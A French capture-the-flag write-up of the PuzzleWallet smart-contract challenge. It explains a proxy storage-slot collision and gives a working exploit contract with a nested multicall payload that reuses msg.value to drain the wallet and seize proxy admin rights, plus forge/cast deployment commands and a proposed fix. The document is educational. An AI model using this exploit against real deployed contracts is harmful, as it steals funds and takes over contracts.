# PuzzleWallet

## Introduction

Pour ce challenge, nous placerons le fichier suivant dans src/.

Pour le contexte, nous avons face à nous 2 contrats intelligent :

- PuzzleProxy : hérite de UpgradeableProxy, qui hérite lui même de Proxy de la librairie PancakeSwap (voir pancake-swap-lib/).

```solidity
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}
```
> Dans ce contrat, les créateurs ont permit d'élire un administrateur. Celui-ci peut changer l'addresse du contrat d'implémentation (voir proxy), et peut aussi approuver un nouvel admin proposé. Ceci concerne juste le proxy ci-dessus, l'admin de celui-ci n'est pas forcément l'admin du contrat PuzzleWallet.

---

- PuzzleWallet : un contrat permettant à ses utilisateurs whitelisted d'utiliser une fonction multicall pour exécuter plusieurs opérations en une seul transaction.

```solidity
contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```
> Ici nous observerons que nous ne pouvons pas faire grand chose premièrement à cause du modifier `onlyWhitelisted()` qui ne se voit modifié que lors que l'owner du contrat PuzzleWallet le décide.


## POC 

### Proxy storage layout : 

Lorsqu'un contrat proxy est utilisé, il y a une chose très importante à retenir si l'on veut absolument éviter tout futurs problèmes. Si les variables du contrat proxy et de l'implémentation ne se reflètent pas, il y a de grands chances de collisions ! Pour être plus précis revoyons le layout utilisé ci-dessus par nos deux contrats :

```solidity
// PuzzleProxy
contract PuzzleProxy is UpgradeableProxy {
	address public pendingAdmin;					// slot 0
	address public admin;							// slot 1
	// <SNIP>
}
// PuzzleWallet
contract PuzzleWallet {
    address public owner;							// slot 0
    uint256 public maxBalance;						// slot 1
    mapping(address => bool) public whitelisted;	// slot 2
    mapping(address => uint256) public balances;	// slot 3
	// <SNIP>
}
```

> Effectivement si l'on ne fait pas refléter nos variables dans un contrats proxy, la collision entre les slots de stockage est inévitable en pratique.

### Nous observons alors que, malgré leurs noms qui diffèrent, les variables pendingAdmin et admin de PuzzleProxy correspondent aux même slots que owner et maxBalance du PuzzleWallet.

---

### Nous procéderons à l'exploitation de la manière suivante
- Attaquer pendingAdmin du contrat Proxy, afin de mettre owner (sur PuzzleWallet) à pendingAdmin (de PuzzleProxy)
- Ajouter notre addresse à la whitelist du contrat PuzzleWallet
- Exécuter un appel multicall chargé d'un payload qui bypassera l'état `bool depositCalled = false` de la fonction `multicall(bytes[] calldata data)`, afin de repasser dans deposit et ainsi multiplier sa balance sur le contrat par le nombre d'appel que l'on y fait (en respectant la balance du contrat)

Ici le contrat possède 0.001 ether.

### Nous construisons un smart contrats Hack.sol (voir src/Hack.sol) qui permettra d'exploiter ce contrat.
```solidity
contract Hack {
    IPuzzleProxy public proxy;	// déclaration du proxy
    IPuzzleWallet public wallet;	// déclaration de wallet
    address public immutable receiver;	// déclaration d'un receiver (pour les deposit)

    constructor(address payable proxyAddr) payable {
        proxy = IPuzzleProxy(proxyAddr); // initialisation proxy
        wallet = IPuzzleWallet(proxyAddr); // initialisation implémentation
        receiver = address(this); // initialisation receiver
    }
	// <SNIP>
}
```

> Maintenant que notre contrat initialise tout d'entrée, passons à l'exécution de l'attaque.

---

Voici une fonction attaque qui, pour l'instant, permettra l'accès au contrat PuzzleWallet.

> Rappelons nous des effets d'une collision. Nous écrirons pendingAdmin sur PuzzleProxy qui écrira aussi owner sur PuzzleWallet.

```solidity
function attack() external payable {
        // Collision: pendingAdmin = this (nous), donc owner = this aussi sur PuzzleWallet
        proxy.proposeNewAdmin(address(this));

        // On whitelist notre contrat 
        wallet.addToWhitelist(address(this));
	// <SNIP>
```

---

Pour la suite nous devrons crafter un payload pour multicall, qui traite un tableau dynamique de bytes. la fonction multicall exécutera chacun des payloads en se déléguant l'appel pour chaque tableau avec `(bool success,) = address(this).delegatecall(data[i])`.
Nous allons grâce à cela réentrer dans la fonction deposit en craftant un payload tel que :

```
MULTICALL (bytes[])
	|
	|
	-----> bytes[0] = DEPOSIT // On dépose msg.value
	|
	|
	-----> bytes[1] = MULTICALL (bytes[]) // On débloque 'bool depositCalled' en réentrant dans multicall
	|					|
	|					|
	|					-----> bytes[0] = DEPOSIT // On dépose msg.value une deuxième fois
	|
	|
	-----> bytes[2] = EXECUTE // On exécute un retrait de la balance de notre addresse
```

Voici le code correspondant : 
```solidity
// <SNIP>
bytes[] memory low_data = new bytes[](1);
bytes[] memory data = new bytes[](3);

data[0] = abi.encodeWithSelector(bytes4(keccak256("deposit()"))); // Premier appel à deposit

low_data[0] = abi.encodeWithSelector(bytes4(keccak256("deposit()"))); // Package nécéssaire pour deuxième multicall

data[1] = abi.encodeWithSelector(bytes4(keccak256("multicall(bytes[])")), low_data); // Empaquetage du deuxième multicall

data[2] = abi.encodeWithSelector(bytes4(keccak256("execute(address,uint256,bytes)"),
	address(this),
	0.002 ether, // 2 fois notre mise
	bytes("") // argument non nécéssaire
));

// <SNIP>
```

---

### Finalement nous faisons un simple call vers la fonction multicall (rappel : nous sommes owner et whitelistés), puis nous appelons setMaxBalance() avec l'addresse de notre choix tel que :

```solidity
// <SNIP>
	wallet.multicall{value: msg.value}(data);
	wallet.setMaxBalance(uint256(uint160(_newAdmin)));
}
```


Nous déployons ce contrat de la manière suivante : 
```bash
forge create --broadcast ./src/Hack.sol:Hack -r $RPC --private-key $PK --constructor-args $PROXY
```

Puis nous appelons notre fonction attack() de la manière suivante : 
```bash
cast send $HACK_ADDR "attack(address)" "$YOUR_ADDR" -r $RPC --private-key $PK --value 0.001ether
```

### Normalement notre attaque a été exécuter avec succès. Nous pouvons finaliser ce challenge en soumettant l'instance !
Nous pouvons vérifier grâce à la commande suivante :
```bash
cast call $PROXY "admin()(address)" -r $RPC # devrait renvoyer votre addresse
```

## Correctif
Pour corriger ce contrat il est important de faire en sorte que l'ordre de déclaration des variables se reflètent dans le proxy et dans le contrat d'implémentation.

Voici un correctif minimal qui aurait empêché l'exploitation ci-dessus :

```solidity
// PuzzleProxy
contract PuzzleProxy is UpgradeableProxy {
	address public pendingAdmin;					// slot 0
	address public admin;							// slot 1
	// <SNIP>
}
// PuzzleWallet
contract PuzzleWallet {
	address public pendingAdmin;					// slot 0
	address public admin;							// slot 1
    address public owner;							// slot 2
    uint256 public maxBalance;						// slot 3
    mapping(address => bool) public whitelisted;	// slot 4
    mapping(address => uint256) public balances;	// slot 5
	// <SNIP>
}

// PuzzleWallet
require(selector == this.multicall.selector, "Do not recall multicall in a multicall !")
if (selector == this.deposit.selector) {
	require(!depositCalled, "Deposit can only be called once");
	// Protect against reusing msg.value
	depositCalled = true;
}
```
